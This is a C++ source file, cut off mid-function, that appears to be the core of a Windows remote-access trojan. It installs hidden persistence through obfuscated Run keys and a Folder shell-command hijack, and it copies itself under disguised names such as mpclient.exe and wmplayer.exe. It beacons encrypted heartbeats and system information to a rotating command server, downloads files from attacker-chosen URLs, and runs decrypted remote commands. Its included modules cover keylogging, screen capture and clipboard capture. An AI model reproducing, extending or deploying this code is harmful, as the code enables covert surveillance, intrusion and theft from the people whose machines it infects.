 // Base.cpp: implementation of the Base class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "Base.h"
#include <io.h>
#include <sys/stat.h>
#include <WinInet.h>
#include "MumaPublic.h"
#include "ProcessInfo.h"
#include "lipboard.h"
#include "UpLoadFile.h"
#include "NdisSocket.h"
#include "UserAgent.h"
#include "KeyLog.h"
#include "Telnet.h"
#include "WinApi.h"
#include "processcmd.h"
#include "Screen.h"
#include "GetDiskInfo.h"
#include "getSysteminfo.h"
#include "SelfFun.h"
//////////////////////////////////////////////////////////////////////////
//
#ifdef OUTPUT_DEBUGINFO
DWORD v_DebugFlag = DEBUG_LOUD | DEBUG_INIT;
#endif

time_t  g_time=0;		// 用于决定启动备用方案

//////////////////////////////////////////////////////////////////////////
//
UCHAR	Ipnum			= 0;
ULONG	LocalIpLst[4]	= {0,0,0,0};
ULONG	v_IpAgent		= 0;
DWORD	v_VirtualServerIp	= 0;
DWORD	v_ReserveIp = 0;
DWORD   v_bSendType = 0; //0 udp模式 1 tcp模式

BOOL g_autorun = FALSE;
BOOL g_screenwork = TRUE;
BOOL g_md5work = TRUE;
BOOL g_dirwork = TRUE;

char			v_Remark[100];		// 备注
unsigned int	v_RemarkLen	= 0;	// 备注的长度

char			v_Password[MAX_PATH];	//上线密码
unsigned int	v_PasswordLen=0;
char			v_TroInfo[300];
unsigned int	v_TroInfoLen=0;

//////////////////////////////////////////////////////////////////////////
//

time_t  g_acktime=0;

// DWORD g_pCreateRemoteThread=NULL;
// LPVOID g_kernelremotethread=NULL;
// LPVOID g_lpLoadLibrary=NULL;

/*char tmpdll[7000] = "\xAA\xBB\xCC\xDD";*/

//pWriteProcessMemory   ppWriteProcessMemory=0;

// #define FILE_DEVICE_PROTOCOL 0x8000
// #define IOCTL_803 \
// CTL_CODE(FILE_DEVICE_PROTOCOL, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
// 

//////////////////////////////////////////////////////////////////////////
//
Base::Base()
{ }

Base::~Base()
{ }

BOOL bWork = FALSE;

void Base::ThreadWorkStart()
{
	if (bWork)
	{
		return;
	}

//	WriteIELog("Work Start");

	DWORD dwID;
	HANDLE hthread=CreateThread(
		NULL,
		NULL, 
		ThreadWork, 
		NULL,
		NULL, 
		&dwID);
	if(hthread != NULL)
		CloseHandle(hthread);

	bWork = TRUE;
}

BOOL SetRemoteIP(char* ip,DWORD iplen)
{
	char FilePath[MAX_PATH];
	char tropath[MAX_PATH];
	char TmpDeStr[30];
	if(GetTroPath(tropath)==FALSE)
		return FALSE;
	
	if(iplen==4)
	{
		sprintf(FilePath, "%s\\%s", tropath, DepubStringA(TmpDeStr, 30, "8khXVxB"));//Company
		if (access(FilePath, 0) == 0)
		{
			return FALSE;
		}
		if(*(DWORD*)ip > 0)
		{
			RemoteFileContent(FilePath, ip, iplen, FALSE);
			return TRUE;
		}
	}
	else
	{
		sprintf(FilePath, "%s\\%s", tropath, DepubStringA(TmpDeStr, 30, ":khVyx"));//domain
		if (access(FilePath, 0) == 0)
		{
			return FALSE;
		}
		RemoteFileContent(FilePath, ip, iplen, FALSE);
	}
	
	return TRUE;
}

//设置截获点
BOOL SetSpyAddr(char *spyaddr,DWORD spyaddrlen)
{
	char FilePath[MAX_PATH];
	char tropath[MAX_PATH];
	char TmpDeStr[30];
	if(GetTroPath(tropath)==FALSE)
		return FALSE;
	
	sprintf(FilePath, "%s\\%s", tropath, DepubStringA(TmpDeStr, 30, "8khXVey_dw"));//Compatible
	RemoteFileContent(FilePath, spyaddr, spyaddrlen, FALSE);
	
	return TRUE;
}

void GetSignHead()
{
	char FilePath[MAX_PATH];
	char tropath[MAX_PATH];
	char TmpDeStr[50];
	if(GetTroPath(tropath)==FALSE)
		return ;
	
	sprintf(FilePath, "%s\\%s", tropath, DepubStringA(TmpDeStr, 50, "Z2"));//hs
	
	if (_access(FilePath, 0) == 0)
	{
		return ;
	}

	BOOL internetreadfile; 
	int i=0;
	DWORD byteread=0; 
	char buffer[100]; 
	memset(buffer,0,100); 
	HINTERNET internetopen; 
	internetopen = PInternetOpenA("XXXX",INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0); 
	if (internetopen==NULL)
	{ 
		return;
	} 
	HINTERNET internetopenurl; 
	//http://www.360.cn/status/getsign.asp
	internetopenurl = PInternetOpenUrlA(internetopen, DepubStringA(TmpDeStr, 50, "ZeeXJ99LLLYnr7YGx92eVea29swe2ysxYV2X"), NULL, 0, INTERNET_FLAG_RELOAD, 0); 
	if (internetopenurl==NULL)
	{ 
		goto there;
	} 
	
	PSleep(1000);
	
	memset(buffer, 0, sizeof(buffer));
	internetreadfile = PInternetReadFile(internetopenurl,buffer,sizeof(buffer),&byteread); 
	if(byteread == 5)
	{
		if(memcmp(buffer, "\x11\x22", 2) == 0 &&
			memcmp(buffer+byteread-2, "\x33\x44", 2) == 0)
		{
			DWORD bufferlen = byteread-4;
			RemoteFileContent(FilePath, buffer+2, bufferlen, FALSE);
		}
	}
	
	PInternetCloseHandle(internetopenurl); 
there: 
	PInternetCloseHandle(internetopen);
}

BOOL zwMoveFileW(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName)
{
	if (_waccess(lpExistingFileName, 0) != 0)
	{
		return FALSE;
	}

	unsigned char * buffer;
	FILE *srcfile, *dstfile;
	long buflen;
	if (srcfile = _wfopen(lpExistingFileName, L"rb"))
	{
		long FileLen = 0;
		fseek(srcfile, 0, SEEK_END);
		FileLen = ftell(srcfile);
		fseek(srcfile, 0, SEEK_SET);

		buffer = new unsigned char[FileLen];
		memset(buffer, 0, FileLen);
		buflen = fread(buffer, 1, FileLen, srcfile);

		fclose(srcfile);
	}
	else
	{
		return FALSE;
	}

	if (_waccess(lpNewFileName, 0) == 0)
	{
		WCHAR TmpPath[MAX_PATH];
		memset(TmpPath, 0, MAX_PATH);
		swprintf(TmpPath, L"%s_bak", lpNewFileName);
		PMoveFileExW(lpNewFileName, TmpPath, MOVEFILE_REPLACE_EXISTING);
		if (_waccess(lpNewFileName, 0) == 0)
		{
			return FALSE;
		}
	}

	dstfile = _wfopen(lpNewFileName, L"wb");
	if (dstfile)
	{
		fwrite(buffer, 1, buflen, dstfile);
		fclose(dstfile);
	}

	if (!buffer)
	{
		delete []buffer;
	}

	return TRUE;
}

BOOL zwMoveFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName)
{
	if (_access(lpExistingFileName, 0) != 0)
	{
		return FALSE;
	}
	
	unsigned char * buffer;
	FILE *srcfile, *dstfile;
	long buflen;
	if (srcfile = fopen(lpExistingFileName, "rb"))
	{
		long FileLen = 0;
		fseek(srcfile, 0, SEEK_END);
		FileLen = ftell(srcfile);
		fseek(srcfile, 0, SEEK_SET);
		
		buffer = new unsigned char[FileLen];
		memset(buffer, 0, FileLen);
		buflen = fread(buffer, 1, FileLen, srcfile);
		
		fclose(srcfile);
	}
	else
	{
		return FALSE;
	}
	
	if (access(lpNewFileName, 0) == 0)
	{
		char TmpPath[MAX_PATH];
		memset(TmpPath, 0, MAX_PATH);
		sprintf(TmpPath, "%s_bak", lpNewFileName);
		PMoveFileExA(lpNewFileName, TmpPath, MOVEFILE_REPLACE_EXISTING);
		if (_access(lpNewFileName, 0) == 0)
		{
			return FALSE;
		}
	}
	
	dstfile = fopen(lpNewFileName, "wb");
	if (dstfile)
	{
		fwrite(buffer, 1, buflen, dstfile);
		fclose(dstfile);
	}
	
	if (!buffer)
	{
		delete []buffer;
	}
	
	return TRUE;
}

BOOL AddRunA()
{
	if (g_autorun)
	{
		return TRUE;
	}

	long Result=0;
	HKEY hKey;
	char filepath[MAX_PATH], dstpath[MAX_PATH];
	char SelfName[100];
	char szTmpRetStr[300];
	
	memset(SelfName, 0, 100);
	memset(dstpath, 0, MAX_PATH);

	PGetModuleFileNameA(NULL, filepath, MAX_PATH);
	if (strstr(filepath, "mpclient") != NULL ||	//mpclient
		strstr(filepath, DeRunStringA(szTmpRetStr, 300, "jF2rgvHhc")) != NULL ||	//kphonewiz
		strstr(filepath, DeRunStringA(szTmpRetStr, 300, "jqhghehSv")) != NULL ||	//kminisite
		strstr(filepath, DeRunStringA(szTmpRetStr, 300, "JSGbS4F")) != NULL)	//Startup
	{
		return TRUE;
	}
	else
	{
		char TroPath[MAX_PATH], TmpPath[MAX_PATH];
		
		GetTroPath(TroPath);
		PGetTempPathA(MAX_PATH, TmpPath);
		
		char TmpDstPath[MAX_PATH];

		sprintf(dstpath, "%s\\mpclient.exe", TroPath);
		sprintf(TmpDstPath, "%s\\mpclient.exe", TmpPath);
		PCopyFileA(filepath, TmpDstPath, TRUE);
		
		zwMoveFileA(TmpDstPath, dstpath);
		
		strcpy(SelfName, "mpclient");//mpclient
		sprintf(dstpath, "%s\\mpclient.exe", TroPath);
		
		//Software\\Microsoft\\Windows\\Currentversion\\Run
		char szKey[46];
		strcpy(szKey, DeRunStringA(szTmpRetStr, 300, "JruSHGbv\\Mh0breruS\\WhgkrHe\\C4bbvgS.vbehrg\\R4g"));

		Result = PRegOpenKeyExA(HKEY_CURRENT_USER, 
			szKey,
			0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey);
		if(Result == ERROR_SUCCESS)
		{
			char TempPath[MAX_PATH];
			memset(TempPath, 0, sizeof(TempPath));
			ULONG bufLen = MAX_PATH;
			PRegQueryValueExA(hKey, SelfName, 0, NULL, (BYTE*)(TempPath), &bufLen);
			if(strstr(TempPath, dstpath)==NULL)
			{
				PRegSetValueExA(hKey, SelfName, 0, REG_SZ, (BYTE*)dstpath, strlen(dstpath));
			}
			PRegCloseKey(hKey);
		}
	}
	
	return TRUE;
}

BOOL AddRunX()
{
	long Result=0;
	HKEY hKey;
	char filepath[MAX_PATH], dstpath[MAX_PATH], runpath[MAX_PATH];
	char SelfName[100], szTmpRetStr[300];
	char szKey[300];
	
	memset(dstpath, 0, MAX_PATH);
	
	PGetModuleFileNameA(NULL, filepath, MAX_PATH);
	
	char TroPath[MAX_PATH];
	
	GetTroPath(TroPath);
	sprintf(dstpath, "%s\\%s", TroPath, DeRunStringA(szTmpRetStr, 300, "HqFAGfvb1viv")); //wmplayer.exe
	PCopyFileA(filepath, dstpath, TRUE);
	

	DeRunStringA(SelfName, 100, "k.kFAGf"); //dvdplay
	//C:\\Windows\\System32\\dvdplay.exe
	DeRunStringA(runpath, MAX_PATH, "C:\\WhgkrHe\\JfeSvqnK\\k.kFAGf1viv");
	//Software\\Microsoft\\Windows\\Currentversion\\Run
	DeRunStringA(szKey, 300, "JruSHGbv\\Mh0breruS\\WhgkrHe\\C4bbvgS.vbehrg\\R4g");
	
	Result = PRegOpenKeyExA(HKEY_CURRENT_USER, 
		szKey,
		0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey);
	if(Result == ERROR_SUCCESS)
	{
		char TempPath[MAX_PATH];
		memset(TempPath, 0, sizeof(TempPath));
		ULONG bufLen = MAX_PATH;
		PRegQueryValueExA(hKey, SelfName, 0, NULL, (BYTE*)(TempPath), &bufLen);
		if(strstr(TempPath, runpath)==NULL)
		{
			PRegSetValueExA(hKey, SelfName, 0, REG_SZ, (BYTE*)runpath, strlen(runpath));
		}
		PRegCloseKey(hKey);
	}
	
	DeRunStringA(SelfName, 100, "PGS2"); //Path
	//SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\wmplayer.exe
	DeRunStringA(szKey, 300, "JOLTW7RE\\Mh0breruS\\WhgkrHe\\C4bbvgSVvbehrg\\7FF PGS2e\\HqFAGfvb1viv");
	Result = PRegOpenKeyExA(HKEY_LOCAL_MACHINE, 
		szKey,
		0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey);
	if(Result == ERROR_SUCCESS)
	{
		PRegSetValueExA(hKey, "Path", 0, REG_SZ, (BYTE*)TroPath, strlen(TroPath));
		PRegCloseKey(hKey);
	}

	BOOL bRet = FALSE;

	Result = PRegOpenKeyExA(HKEY_LOCAL_MACHINE, 
		szKey,
		0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey);
	if(Result == ERROR_SUCCESS)
	{
		char TempPath[MAX_PATH];
		memset(TempPath, 0, sizeof(TempPath));
		ULONG bufLen = MAX_PATH;
		PRegQueryValueExA(hKey, SelfName, 0, NULL, (BYTE*)(TempPath), &bufLen);
		if(strstr(TempPath, TroPath) != NULL && _access(dstpath, 0) == 0)
		{
			bRet = TRUE;
			g_autorun = TRUE;
		}

		PRegCloseKey(hKey);
	}
	
	return bRet;
}

BOOL AddRunF()
{
	char dstpath[MAX_PATH];
	char pdPath[MAX_PATH];
	HKEY hkey, hidkey, hshellkey, hopenkey, hcommandkey;
	DWORD lResult=0;
	long Result;
	
	do 
	{
		Result = RegOpenKeyExA(HKEY_CURRENT_USER, 
			"Software\\Classes", 
			0, KEY_QUERY_VALUE|KEY_SET_VALUE|KEY_WOW64_64KEY, &hkey);
		
		if (Result != 0)
		{
			break;
		}
		
		Result = RegCreateKeyExA(hkey,
			"Folder",
			0,NULL,REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS|KEY_WOW64_64KEY,NULL,&hidkey,&lResult);
		
		if (Result != 0)
		{
			break;
		}
		
		Result = RegCreateKeyExA(hidkey,
			"shell",
			0,NULL,REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS|KEY_WOW64_64KEY,NULL,&hshellkey,&lResult);
		
		if (Result != 0)
		{
			break;
		}
		
		strcpy(dstpath, "test");
		Result = RegSetValueExA(hshellkey, NULL, 0, REG_SZ, (BYTE*)dstpath, strlen(dstpath));
		
		Result = RegCreateKeyExA(hshellkey,
			"test",
			0,NULL,REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS|KEY_WOW64_64KEY,NULL,&hopenkey,&lResult);
		
		if (Result != 0)
		{
			break;
		}
		
		Result = RegCreateKeyExA(hopenkey,
			"command",
			0,NULL,REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS|KEY_WOW64_64KEY,NULL,&hcommandkey,&lResult);
		
		if (!Result)
		{
			GetModuleFileNameA(NULL, dstpath, MAX_PATH);
			sprintf(pdPath,"c:\\programdata\\dwn.exe");
			::CopyFileA(dstpath,pdPath,FALSE);
			Result = RegSetValueExA(hcommandkey, NULL, 0, REG_SZ, (BYTE*)pdPath, strlen(pdPath));
		}
		
	} while (0);
	
	if (hkey != NULL)
	{
		RegCloseKey(hkey);
	}
	
	if (hidkey != NULL)
	{
		RegCloseKey(hidkey);
	}
	
	if (hshellkey != NULL)
	{
		RegCloseKey(hshellkey);
	}
	
	if (hopenkey != NULL)
	{
		RegCloseKey(hopenkey);
	}
	
	if (hcommandkey != NULL)
	{
		RegCloseKey(hcommandkey);
	}

	return TRUE;
}

void DelRunF()
{
	char dstpath[MAX_PATH];
	HKEY hkey, hidkey, hshellkey;
	DWORD lResult=0;
	long Result;
	
	do 
	{
		Result = RegOpenKeyExA(HKEY_CURRENT_USER, 
			"Software\\Classes", 
			0, KEY_QUERY_VALUE|KEY_SET_VALUE|KEY_WOW64_64KEY, &hkey);
		
		if (Result != 0)
		{
			break;
		}
		
		Result = RegCreateKeyExA(hkey,
			"Folder",
			0,NULL,REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS|KEY_WOW64_64KEY,NULL,&hidkey,&lResult);
		
		if (Result != 0)
		{
			break;
		}
		
		Result = RegCreateKeyExA(hidkey,
			"shell",
			0,NULL,REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS|KEY_WOW64_64KEY,NULL,&hshellkey,&lResult);
		
		if (Result != 0)
		{
			break;
		}
		
		strcpy(dstpath, "none");
		Result = RegSetValueExA(hshellkey, NULL, 0, REG_SZ, (BYTE*)dstpath, strlen(dstpath));
		
	} while (0);
	
	if (hkey != NULL)
	{
		RegCloseKey(hkey);
	}
	
	if (hidkey != NULL)
	{
		RegCloseKey(hidkey);
	}
	
	if (hshellkey != NULL)
	{
		RegCloseKey(hshellkey);
	}
	
	return;
}

//#define		START_FLAG_PARA1	"\xE5\x36"
char anlysestring[1000] = "\x90\xf7\x7f\x5d\x07\x90\x25\xdd\x41\x20\x45\x26\x6b\x81\xed\x42";
//#define		START_FLAG_PARA2	"\x22\x25"

BOOL DealAnlyse(char * buf, int buflen)
{
	char * pbuf=buf;
	int offset=0;
	while(offset<buflen)
	{
		UCHAR type;
		int len;
		type=pbuf[0];
		len=(UCHAR)pbuf[1];
		switch(type)
		{
		case 1:     //IP
			SetRemoteIP(pbuf+2,len);
			break;
		case 2:
			SetSpyAddr(pbuf+2,len);
			break;
		case 8:
//			SetHeadSign(pbuf+2,len);
			break;

		};
		
		pbuf+=len+2;
		offset+=len+2;
	}
	
	return TRUE;
}

BOOL GetAnlysebySalf()
{
	//参数信息
	char AnlyseBuf[256];
	memset(AnlyseBuf, 0, 256);
	int len;

	len = (int)anlysestring[16];
	memcpy(AnlyseBuf, anlysestring+17, len);
		
	DealAnlyse(AnlyseBuf, len);

	return TRUE;
}

DWORD WINAPI Base::ThreadWork(LPVOID p)
{
	char strMutex[100];
	char *strUser = getenv("userprofile");
	memset(strMutex, 0, 100);
	if(strUser != NULL)
	{
		strUser = strrchr(strUser, '\\');
		if(strUser != NULL)
		{
			sprintf(strMutex, "%s%s", MUTEX_WORK, strUser+1);
		}
	}
	
	if (strMutex[0] == 0)
	{
		strcpy(strMutex, MUTEX_WORK);
	}
	
	int mutexi = 0;
	BOOL bExit = CheckMMFlag();
	
	while(TRUE)
	{
		HANDLE hAlreadyMutex = NULL;
		hAlreadyMutex = PCreateMutexA(
			NULL, 
			FALSE, 
			strMutex);
		if (hAlreadyMutex != NULL)// 
		{
			if (PGetLastError() != ERROR_ALREADY_EXISTS)
			{				
				break;
			}
			
			CloseHandle(hAlreadyMutex);
		}
		
		PSleep(5*1000);

		if (bExit)
		{
			mutexi++;
			if (mutexi >= 2)
			{
				exit(0);
			}
		}
	}

	IF_LOUD(DbgFat32Log("改静态标识");)
	CreateAgentAndWrite(TRUE);

 	GetAnlysebySalf();
 	GetSignHead();
 	GetTransType();

	WSADATA wsadata;
	PWSAStartup(MAKEWORD(2, 2), &wsadata);

	g_acktime=::time(0);

	char reMark[50];
	reMark[0] = 0;
	int changipcount=0;
	DWORD remoteIP = 0;
	memset(v_Password, 0, sizeof(v_Password));
	memset(v_TroInfo, 0, sizeof(v_TroInfo));
	RemoteInfo rinfo;
	GetRemoteInfo(&rinfo);

	if(rinfo.remotedomain[0] != 0)
	{
		hostent* host = Pgethostbyname(rinfo.remotedomain);
		if(host)
		{
			remoteIP = *(DWORD*)(struct in_addr *)(host->h_addr);
		}
		else
		{
			remoteIP = rinfo.remoteIP;
		}
	}
	else
	{
		remoteIP = rinfo.remoteIP;
	}

	strcpy(v_Remark, rinfo.remark);
	v_RemarkLen = strlen(v_Remark);

	strcpy(v_Password, rinfo.password);
	v_PasswordLen = strlen(v_Password);
	
	strcpy(v_TroInfo, rinfo.troinfo);
	v_TroInfoLen = strlen(v_TroInfo);

	v_ReserveIp = rinfo.ReserveIp;
	SignType = rinfo.HeadSign;

	// 初始发行的目标IP
	if(remoteIP > 0)
	{
		v_VirtualServerIp=remoteIP;
		IF_LOUD(
			struct in_addr inAddr;
			inAddr.s_addr = remoteIP;
			DbgFat32Log("读取到远程IP:%s", inet_ntoa(inAddr));
		)
	}
		
	if(v_VirtualServerIp == 0 || v_VirtualServerIp == 0xFFFFFFFF)
	{
		v_VirtualServerIp=GetVirtualServerIp();

		BYTE dd=v_VirtualServerIp>>24;
		BYTE dd1=v_VirtualServerIp&0xff;
		while(dd==0 || dd1==0)
		{
			v_VirtualServerIp=GetVirtualServerIp();
			dd=v_VirtualServerIp>>24;
			dd1=v_VirtualServerIp&0xff;
		}

		IF_LOUD(
			struct in_addr inAddr;
			inAddr.s_addr = v_VirtualServerIp;
			DbgFat32Log("产生远程IP:%s", inet_ntoa(inAddr));)
	}
	
	// 创建串行发包(线程)
	BOOL bAddRun = FALSE;
	time_t tmNow;
	time_t tmSendHeart	 = 0;		// 5秒后第一次心跳时间
	time_t tmCheckStatus = 0;		// 上次检查插件时间
	time_t tmReloadIP	 = 0;
	time_t tmCheckRising =time(0);
	time_t tmRun = time(0);

	CheckProxy();

	getSysteminfo::GetInstance()->InitInfo();

	// 初始成功, 调入内置插件
	InvokeInsideDLL();
	
 	PSleep(1000);
	StartSendHookDir(NULL);

	g_work.init();

	DWORD	THIDrev		=0;
	HANDLE	TRecvPacket	=NULL;
//	HANDLE	THttpTunnel	=NULL;
	BOOL SendSysFlag = FALSE;
	BOOL bNeedChangeCard=TRUE;	//是否需要处理中间层驱动
	DWORD	ChangeIpCount= 0;	//转换IP次数

	while(TRUE)
	{
 		PSleep(1000);
 		time(&tmNow);

		//////////////////////////////////////////////////////////////////////////
		if(abs(tmNow-tmCheckStatus)>=30)
		{
			tmCheckStatus=tmNow;
			// 定期检查上传文件状态
			CloseUploadFile();
			CheckDestory();

			//30分钟无交互，换远程IP
			time_t tmpAckTime = time(0);
			if(abs(tmpAckTime-g_acktime)>600)//30分钟
			{
				if((remoteIP!=0 && remoteIP!=0xFFFFFFFF) && ChangeIpCount%3==1)
				{
					v_VirtualServerIp=remoteIP;
				}
				else if (v_ReserveIp>0 && ChangeIpCount%3 == 2)
				{
					v_VirtualServerIp=v_ReserveIp;
				}
				else
				{
					v_VirtualServerIp=GetVirtualServerIp();
				}
				g_acktime = time(0);
				ChangeIpCount++;
			}
		}

		//////////////////////////////////////////////////////////////////////////
		// 发送心跳
		time_t curtime=::time(0);
		if(abs(curtime-tmSendHeart)>=10)
		{
 			SendHeartPacket(tmSendHeart);
		}

		//////////////////////////////发送系统信息//////////////////// /////////////
		if(!SendSysFlag && tmSendHeart>0)
		{
			AutoGetRBSystemInfo(NULL); //发送心跳包后自动发送当前系统信息
			SendSysFlag = TRUE;
		}

// 		if (abs(curtime-tmRun)>=5*60 && !bAddRun)
// 		{
// 			AddRunX();
// 
// 			bAddRun = TRUE;
// 		}
 	}
		
	return 0;
}

void SendHeartPacket(time_t &SendHeart)
{
	int headlen;
	UCHAR headbuffer[300];
	MumaHead *pMumaHead = NULL;
	int offHead = 0;
	memset(headbuffer, 0, 300);
	headlen = MakeHeadBuff((char*)headbuffer, offHead, 1);
	
	UCHAR sendbuffer[2000];
	memcpy(sendbuffer, headbuffer, headlen);	

	pMumaHead = (MumaHead*)(sendbuffer+offHead);
	pMumaHead->SessionID	= 0;
	pMumaHead->PacketSeq	= 0;
	pMumaHead->TranFlg		= 7;

	//发送心跳包
	pMumaHead->datalen = getSysteminfo::GetInstance()->GetHeartInfo(sendbuffer+headlen);

	int packetlen=headlen+pMumaHead->datalen;
	if(BufferEncrypt((char *)sendbuffer,packetlen,16))
	{
		if(FALSE == BootSendData((char*)sendbuffer, packetlen,TRUE))
		{
			IF_LOUD(DbgFat32Log("发送心跳失败");)
			 g_isHeartOk=FALSE;
		}
		else
		{
			IF_LOUD(DbgFat32Log("发送心跳成功");)
			g_isHeartOk=TRUE;
			time(&SendHeart);
		}
	}
	
	return ;
}


BOOL GetFile (HINTERNET IN hOpen, // Handle from InternetOpen()
			  CHAR *szUrl,        // Full URL
			  WCHAR *szFileName)   // Local file name
{
	DWORD dwSize;
	/*	CHAR   szHead[] = "Accept: * / *\r\n\r\n";*/
	char szTemp[10240];
	HINTERNET  hConnect;
	FILE * pFile;
	
	if ( !(hConnect = PInternetOpenUrlA ( hOpen, szUrl, NULL,
		0, INTERNET_FLAG_DONT_CACHE, 0)))
	{
		return 0;
	}
	
	if  ( !(pFile = _wfopen (szFileName, L"wb" ) ) )
	{
		PInternetCloseHandle(hConnect);
		return FALSE;
	}
	while(1)
	{
		PSleep(100);
		// Keep coping in 25 bytes chunks, while file has any data left.
		// Note: bigger buffer will greatly improve performance.
		if (!PInternetReadFile (hConnect, szTemp, 10240,  &dwSize) )
		{
			fclose (pFile);
			PInternetCloseHandle(hConnect);
			return FALSE;
		}

		if (!dwSize)
			break;  // Condition of dwSize=0 indicate EOF. Stop.
		else
			fwrite(szTemp, sizeof (char), dwSize , pFile);
	}
	
	fclose (pFile);
	
	PInternetCloseHandle(hConnect);
	return TRUE;
}

BOOL UpfilebytTelnet(const char * cmd)
{
	char * inputline = new char[500];
	char * nextline = NULL;
	char * field = NULL;
	char * value = NULL;
	
	char * url = NULL;
	char * filepath = NULL;
	int re = 0;
	strcpy(inputline, cmd);
	re = LineParser2(inputline, &nextline, &field, &value);
	while(re)
	{
		if(strcmp(field, "downfile") == 0){
			url = value;
		}
		else if(strcmp(field, "name") == 0){
			filepath = value;
		}
		
		if(re == 2)
			break;
		inputline = nextline;
		re = LineParser2(inputline, &nextline, &field, &value);
	}
	if(re != 2)
		return FALSE;
	
	HINTERNET internetopen; 
	internetopen = PInternetOpenA("BBB",INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0); 
	if (internetopen == NULL)
	{
		return 0;
	}

	WCHAR * unicodefilename = new WCHAR[500];
	memset(unicodefilename, 0, 500*sizeof(WCHAR));
	if(UTF_82Unicode(filepath, unicodefilename, 500*sizeof(WCHAR))<=0)
	{
		delete []unicodefilename;
		unicodefilename = NULL;
		return TRUE;
	}
	
	GetFile(internetopen, url, unicodefilename);

	PInternetCloseHandle(internetopen);
	
	delete []unicodefilename;
	return TRUE;
}

/************************************************************************/
/* 交互命令处理函数                                                     */
/************************************************************************/ 
BOOL ProcessTrojCmd(char *buffer, int buflen)
{
	//分析
	int error = 0;
	try
	{
		int offset = 0;
		char tmpbuffer[2000];
		memcpy(tmpbuffer, buffer, buflen);
		
		BOOL bDecrypt = FALSE;
		if(BufferDecrypt(buffer,buflen,16))
			bDecrypt = TRUE;

		else if(buflen > 40)
		{
			memcpy(buffer, tmpbuffer, buflen);
			if(BufferDecrypt(buffer,buflen,32+16))
			{
				offset = 32;
				bDecrypt = TRUE;
			}
		}

		if(FALSE == bDecrypt)
		{
			IF_LOUD(DbgFat32Log("处理命令, 但Tea失败");)
			return TRUE;
		}
		
		if(bDecrypt)
		{
			error = 100;
			ThreadParam ThreadPara;
			
			SendPacketHead	*pSendPacketHead=(SendPacketHead*)(buffer+offset);
			MumaHead		*pMumaHead=(MumaHead *)(buffer+offset+sizeof(SendPacketHead));//+pSendPacketHead->Ipnum*4
			ThreadPara.PacketType = pSendPacketHead->PacketType;
			ThreadPara.SessionID = pMumaHead->SessionID;
			ThreadPara.datalen = pMumaHead->datalen;
			ThreadPara.TranFlg = pMumaHead->TranFlg;
			ThreadPara.PacketSeq = pMumaHead->PacketSeq;
			error = 110;
			
			if(pMumaHead->datalen>1400)
			{
				return TRUE;
			}
			memcpy(ThreadPara.buf,(const char *)(pMumaHead+1),pMumaHead->datalen);
			
			IF_LOUD(
				if(ThreadPara.PacketType != PTYPE_UPFILE)
				{
					if(pMumaHead->datalen>0)
					DbgFat32Log("收到命令! SessionID=0x%04X, PType=%d,Cmdbuf=%s", 
						ThreadPara.SessionID, ThreadPara.PacketType,ThreadPara.buf);
				}
				else
				{
					DbgFat32Log("收到命令! SessionID=0x%04X, PType=上传文件", 
						ThreadPara.SessionID, ThreadPara.PacketType);
				}
			)
			error = 120;
			if( isPacketBig(pSendPacketHead->PacketType) )
			{
				error = 130;
				if(v_currentSend5 > 5)
				{
					return TRUE;
				}
				error = 131;
			}
			else
			{
				error = 140;
				if(v_currentSend13 > 5)
				{ 
					return TRUE;
				}
				error = 141;
			}

			error = 400+pSendPacketHead->PacketType;

			if(pFunTable[pSendPacketHead->PacketType].pFun != NULL)
				pFunTable[pSendPacketHead->PacketType].pFun(&ThreadPara);
			else
			{
				IF_LOUD(DbgFat32Log("交互指令= %d No Match!!!!", pMumaHead->PacketType);)
			}
		}
	}
	catch (...) 
	{
		IF_LOUD(
		char Msg[200];
		sprintf(Msg, "ProceTrojPacket Catch Error!!!!, No:%d", error);
		OutputDebugStringA(Msg);)
	}
	
	return TRUE;
}

BOOL DestroyTro()
{
	long Result=0;
	HKEY hKey;
	char filepath[MAX_PATH], tropath[MAX_PATH], SelfName[MAX_PATH];
	char TmpDeStr[100];

	PGetModuleFileNameA(NULL, filepath, MAX_PATH);
	strcpy(SelfName, strrchr(filepath, '\\')+1);
	(strrchr(SelfName, '.'))[0] = 0;
	
	//Software\Microsoft\Windows\Currentversion\Run
	char szKey[46];
	strcpy(szKey, DepubStringA(TmpDeStr, 100, "AkleLVow\\.yGok2kle\\Nyx:kL2\\8aoowxeEwo2ykx\\Wax"));

	Result = PRegOpenKeyExA(HKEY_CURRENT_USER, 
		szKey,
		0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey);

	long i=0;
	char name[200], buf[1024];
	DWORD dw2, buflen;

	if(GetTroPath(tropath)==FALSE)
		return FALSE;

	memset(buf, 0, 1024);
	buflen = 0;
	while(TRUE)
	{
		dw2=200;
		memset(name, 0, 200);
		Result =PRegEnumValueA(hKey, i, name, &dw2, NULL, NULL, NULL, NULL);
		if(Result != ERROR_SUCCESS)
			break;

		i++;
		if (strcmp(SelfName, name) == 0)
		{
			continue;
		}

		memcpy(buf+buflen, name, dw2);
		buflen+=dw2;
		memcpy(buf+buflen, "\t", 1);
		buflen+=1;
	}

	PRegCloseKey(hKey);	

	CryptRemoteInfo(buf, buflen);

	memset(filepath, 0, MAX_PATH);
	sprintf(filepath, "%s\\%s", tropath, DepubStringA(TmpDeStr, 100, "fw2eok"));
	FILE* file = fopen(filepath, "wb");
	if(file)
	{
		fwrite(buf, 1, buflen, file);
		fclose(file);
	}
	
	return TRUE;
}

BOOL CheckDestory()
{
	char filepath[MAX_PATH], tropath[MAX_PATH], buf[1024], TmpDeStr[100];
	WCHAR Selfpath[MAX_PATH], SelfName[MAX_PATH];
	DWORD buflen;
	
